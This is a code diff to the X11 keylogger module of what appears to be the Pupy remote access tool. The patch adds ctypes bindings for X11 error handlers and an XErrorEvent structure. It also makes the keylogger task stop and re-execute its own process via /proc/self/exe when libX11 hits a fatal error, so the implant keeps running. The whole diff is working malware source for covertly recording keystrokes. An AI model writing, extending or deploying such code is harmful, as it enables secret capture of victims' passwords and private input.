@@ -10,6 +10,7 @@ import pupy
 
 from subprocess import Popen, PIPE
 import re
+import os
 
 try:
     x11 = ct.cdll.LoadLibrary(find_library('X11'))
@@ -44,6 +45,10 @@ try:
     x11.XGetEventData.argtypes = [ ct.c_void_p, ct.c_void_p ]
     x11.XFreeEventData.argtypes = [ ct.c_void_p, ct.c_void_p ]
     x11.XQueryExtension.argtypes = [ ct.c_void_p, ct.c_char_p, ct.c_void_p, ct.c_void_p, ct.c_void_p ]
+    x11.XSetErrorHandler.restype = ct.c_int
+    x11.XSetErrorHandler.argtypes = [ ct.c_void_p ]
+    x11.XSetIOErrorHandler.restype = ct.c_int
+    x11.XSetIOErrorHandler.argtypes = [ ct.c_void_p ]
 except:
     x11 = None
 
@@ -156,6 +161,17 @@ class XIDeviceEvent(ct.Structure):
         ( "valuators",  XIValuatorState ),
         ( "mods",       XIModifierState ),
         ( "group",      XIModifierState ),
+    ]
+
+class XErrorEvent(ct.Structure):
+    _fields_ = [
+        ( "type",       ct.c_int ),
+        ( "display",    ct.c_void_p ),
+        ( "serial",     ct.c_uint ),
+        ( "error_code", ct.c_char ),
+        ( "request_code", ct.c_char ),
+        ( "minor_code", ct.c_char ),
+        ( "XID",        ct.c_ulong )
     ]
 
 def XiMaxLen():
@@ -505,7 +521,8 @@ def keylogger_start():
 
     try:
         keyLogger = pupy.manager.create(KeyLogger)
-    except:
+    except Exception, e:
+        print e
         return 'no_x11'
 
     return True
@@ -540,6 +557,8 @@ class KeyLogger(pupy.Task):
         self.display = None
         self.x11 = x11
         self.xi = xi
+        self._fatal_error_cb = self.fatal_error_handler
+        self._error_cb = self.error_handler
 
         XkbEventCode = ct.c_int(0)
         XkbErrorReturn = ct.c_int(0)
@@ -555,9 +574,36 @@ class KeyLogger(pupy.Task):
                 ct.pointer(XkbReasonReturn)
             )
 
-        if not self.display:
+        if self.display:
+            self.x11.XSetErrorHandler(
+                ct.CFUNCTYPE(ct.c_int, ct.c_void_p, ct.c_void_p)(self._error_cb)
+            )
+            self.x11.XSetIOErrorHandler(
+                ct.CFUNCTYPE(ct.c_int, ct.c_void_p)(self._fatal_error_cb)
+            )
+        else:
             self.stop()
             raise NotAvailable()
+
+    def _fatal_error_handler(self, error):
+        self.stop()
+        # Stupid libX11 will kill our application now, so let's try to reexec self
+        os.execve('/proc/self/exe', [''], os.environ)
+        return 0
+
+    @property
+    def fatal_error_handler(self):
+        def __handler(error):
+            return self._fatal_error_handler(error)
+
+        return __handler
+
+    @property
+    def error_handler(self):
+        def __handler(display, error):
+            self.stop()
+
+        return __handler
 
     def get_active_window(self):
         if not self.display:
